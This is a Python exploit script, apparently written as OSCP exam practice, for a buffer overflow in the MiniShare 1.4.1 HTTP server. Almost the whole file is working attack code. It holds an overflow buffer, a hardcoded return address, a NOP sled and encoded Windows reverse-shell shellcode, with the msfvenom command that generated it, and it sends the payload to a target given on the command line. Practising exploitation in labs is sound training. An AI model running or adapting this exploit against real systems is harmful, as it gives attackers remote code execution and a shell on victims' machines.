#!/usr/bin/python

import time, struct, sys
import socket as so

#         ---------------------------------------
#        .: DEVELOPED BY BRYAN RODRIGUEZ MARTIN :.
#        .:     EXPLOIT FOR MINISHARE 1.4.1     :.
#        .:         PRACTICE FOR OSCP           :.
#         ---------------------------------------



trash = "A" * 1787
eip = "\x53\x93\x3a\x7e"
nops = "\x90" * 20

# Badchars --> [ 0x00 ,  0x0d ]
bchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# Generate shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=5555 -f python -b '\x00\x0d' -e x86/shikata_ga_nai

buf =  ""
buf += "\xda\xd9\xd9\x74\x24\xf4\xb8\xb9\xa9\x8a\x09\x5d\x29"
buf += "\xc9\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xfc\xba\x68"
buf += "\xfc\x02\x54\xee\xff\xfa\xa5\x8f\x76\x1f\x94\x8f\xed"
buf += "\x54\x87\x3f\x65\x38\x24\xcb\x2b\xa8\xbf\xb9\xe3\xdf"
buf += "\x08\x77\xd2\xee\x89\x24\x26\x71\x0a\x37\x7b\x51\x33"
buf += "\xf8\x8e\x90\x74\xe5\x63\xc0\x2d\x61\xd1\xf4\x5a\x3f"
buf += "\xea\x7f\x10\xd1\x6a\x9c\xe1\xd0\x5b\x33\x79\x8b\x7b"
buf += "\xb2\xae\xa7\x35\xac\xb3\x82\x8c\x47\x07\x78\x0f\x81"
buf += "\x59\x81\xbc\xec\x55\x70\xbc\x29\x51\x6b\xcb\x43\xa1"
buf += "\x16\xcc\x90\xdb\xcc\x59\x02\x7b\x86\xfa\xee\x7d\x4b"
buf += "\x9c\x65\x71\x20\xea\x21\x96\xb7\x3f\x5a\xa2\x3c\xbe"
buf += "\x8c\x22\x06\xe5\x08\x6e\xdc\x84\x09\xca\xb3\xb9\x49"
buf += "\xb5\x6c\x1c\x02\x58\x78\x2d\x49\x35\x4d\x1c\x71\xc5"
buf += "\xd9\x17\x02\xf7\x46\x8c\x8c\xbb\x0f\x0a\x4b\xbb\x25"
buf += "\xea\xc3\x42\xc6\x0b\xca\x80\x92\x5b\x64\x20\x9b\x37"
buf += "\x74\xcd\x4e\x97\x24\x61\x21\x58\x94\xc1\x91\x30\xfe"
buf += "\xcd\xce\x21\x01\x04\x67\xcb\xf8\xcf\x82\x07\x02\x5e"
buf += "\xfb\x15\x02\x4b\x48\x90\xe4\x19\xbe\xf5\xbf\xb5\x27"
buf += "\x5c\x4b\x27\xa7\x4a\x36\x67\x23\x79\xc7\x26\xc4\xf4"
buf += "\xdb\xdf\x24\x43\x81\x76\x3a\x79\xad\x15\xa9\xe6\x2d"
buf += "\x53\xd2\xb0\x7a\x34\x24\xc9\xee\xa8\x1f\x63\x0c\x31"
buf += "\xf9\x4c\x94\xee\x3a\x52\x15\x62\x06\x70\x05\xba\x87"
buf += "\x3c\x71\x12\xde\xea\x2f\xd4\x88\x5c\x99\x8e\x67\x37"
buf += "\x4d\x56\x44\x88\x0b\x57\x81\x7e\xf3\xe6\x7c\xc7\x0c"
buf += "\xc6\xe8\xcf\x75\x3a\x89\x30\xac\xfe\xb9\x7a\xec\x57"
buf += "\x52\x23\x65\xea\x3f\xd4\x50\x29\x46\x57\x50\xd2\xbd"
buf += "\x47\x11\xd7\xfa\xcf\xca\xa5\x93\xa5\xec\x1a\x93\xef"

buff = trash + eip + nops + buf



try:
 server = str(sys.argv[1])
 port = int(sys.argv[2])
except IndexError:    
 print "[*] Usage example:  python %s IP  PORT" % sys.argv[0]
 sys.exit()
print "[+] Sending exploit . . with  %s bytes" % len(buff)
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
 s.connect((server,port))
 s.send('GET ' + buff + '\r\n\r\n')
 s.close()
 print "[!] Done! Good luck!"
except:
 print "[+] Connection failed. IP/Port correct?"
sys.exit()
